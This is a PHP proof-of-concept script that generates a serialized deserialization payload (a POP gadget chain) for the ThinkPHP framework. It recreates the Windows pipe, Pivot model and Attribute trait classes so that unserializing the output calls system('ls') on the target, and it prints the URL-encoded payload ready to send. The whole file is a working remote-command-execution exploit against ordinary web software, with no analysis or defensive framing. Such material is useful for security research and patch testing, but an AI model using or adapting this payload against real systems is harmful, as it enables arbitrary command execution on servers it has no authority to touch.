<?php
//https://xz.aliyun.com/t/6619#toc-2
namespace think\process\pipes {
    class Windows
    {
        private $files;
        public function __construct($files)
        {
            $this->files = [$files];
        }
    }
}

namespace think\model\concern {
    trait Conversion
    {    
    }

    trait Attribute
    {
        private $data;
        private $withAttr = ["lin" => "system"]; //函数

        public function get()
        {
            $this->data = ["lin" => "ls"]; //参数
        }
    }
}

namespace think {
    abstract class Model
    {
        use model\concern\Attribute;
        use model\concern\Conversion;
    }
}

namespace think\model{
    use think\Model;
    class Pivot extends Model
    {
        public function __construct()
        {
            $this->get();
        }
    }
}

namespace {

    $conver = new think\model\Pivot();
    $payload = new think\process\pipes\Windows($conver);
    echo urlencode(serialize($payload));
}
?>